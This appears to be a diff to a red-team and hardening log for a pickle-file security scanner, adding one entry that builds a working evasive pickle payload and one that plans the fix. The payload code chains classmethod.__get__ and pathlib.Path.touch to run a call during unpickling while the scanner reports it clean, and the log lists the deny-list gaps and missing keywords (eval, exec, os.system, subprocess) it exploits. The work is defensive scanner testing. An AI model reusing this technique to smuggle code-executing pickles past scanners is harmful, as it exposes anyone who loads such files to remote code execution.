@@ -2950,3 +2950,111 @@ Blocking plan:
 Performance note: the fix is a single exact builtin-name membership check. It
 does not add descriptor-object tracking, dotted-name expansion, or stack-flow
 simulation.
+
+## Turn 65 - `builtins.classmethod.__get__` bound-method gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `classmethod.__get__` to
+bind an attacker-selected function to an attacker-controlled object before a
+later stack call.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_builtins_classmethod_get_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "classmethod"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x94",
+        sg("builtins", "classmethod.__get__"),
+        b"(",
+        b"h\x00",
+        b"N",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"tR\x94",
+        b"h\x01)R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=163`, `bytes_total=163`, `opcode_count=32`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.classmethod`, `pathlib.Path.touch`,
+  `builtins.classmethod.__get__`, and `pathlib.PosixPath`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final empty-argument `REDUCE`
+  returns `<bound method Path.touch of PosixPath(...)>` and does not create
+  `/tmp/ma_builtins_classmethod_get_marker`
+- Unpickle result: the full payload creates
+  `/tmp/ma_builtins_classmethod_get_marker` and returns `None`
+- RCE mechanism: `classmethod.__get__(cm, None, marker)` returns a bound method
+  whose `__self__` is the marker path. The payload first constructs
+  `classmethod(pathlib.Path.touch)`, then uses the unbound descriptor getter to
+  synthesize `Path.touch` bound to the attacker-chosen `Path`, then invokes the
+  bound method with an empty argument tuple during deserialization.
+
+Why the scanner missed it:
+
+- `builtins.classmethod` is absent from `BUILTIN_DANGEROUS_NAMES`.
+- `builtins.classmethod.__get__` is also absent from
+  `BUILTIN_DANGEROUS_NAMES`, and builtin checks are exact-name checks even
+  when the pickle `STACK_GLOBAL` name contains dots.
+- The payload uses only currently clean globals:
+  `builtins.classmethod`, `pathlib.Path.touch`,
+  `builtins.classmethod.__get__`, and `pathlib.PosixPath`.
+- The dangerous callable is hidden inside a synthesized bound method before
+  the final stack-object call, so the final `REDUCE` has no policy-listed
+  global to classify.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is the `classmethod` sibling of the descriptor-method
+surface, and the focused next block can stay cheap: add `classmethod.__get__`
+to `BUILTIN_DANGEROUS_NAMES`, plus a manual-pickle oracle regression proving
+scan-time detection before the bound method creates the marker. The hot path
+remains the existing builtin exact-name membership check.
+
+## Turn 66 - Block `builtins.classmethod.__get__` bound methods
+
+Blocking plan:
+
+- Add `classmethod.__get__` to `BUILTIN_DANGEROUS_NAMES`. The exact dotted
+  builtin name reaches the descriptor method that can bind an attacker-selected
+  function to an attacker-controlled object.
+- Leave `builtins.classmethod` itself allowed because constructing the
+  descriptor does not execute or bind the wrapped callable. The sink is the
+  descriptor-get method that synthesizes the later callable bound method.
+- Add a CPython oracle regression that builds the manual
+  `classmethod(Path.touch)` payload, verifies scan-time detection on the
+  descriptor-get control and RCE variants, proves the control bound method does
+  not create the marker, then proves the full payload creates the marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix is a single exact builtin-name membership check. It
+does not add descriptor-object tracking, bound-method state modeling, or stack
+call simulation.
